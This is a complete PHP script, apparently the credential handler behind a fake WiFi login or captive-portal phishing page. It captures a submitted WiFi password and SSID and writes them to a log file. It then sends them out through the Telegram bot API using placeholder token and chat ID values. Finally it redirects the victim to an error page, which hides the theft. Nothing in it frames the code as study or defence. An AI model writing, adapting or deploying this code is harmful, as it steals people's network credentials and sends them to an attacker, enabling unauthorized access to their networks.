<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST["password"];
    $ssid = $_GET["ssid"] ?? "Unknown_WiFi";

    $logData = "SSID: " . $ssid . " | Password: " . $password . "\n";
    file_put_contents("log.txt", $logData, FILE_APPEND);

    $token = "YOUR_BOT_TOKEN";
    $chat_id = "YOUR_TELEGRAM_ID";

    $message = "🔹 WiFi Login Captured 🔹\nSSID: $ssid\nPassword: $password";
    $telegram_url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($telegram_url);

    header("Location: error.html");
    exit();
}
?>
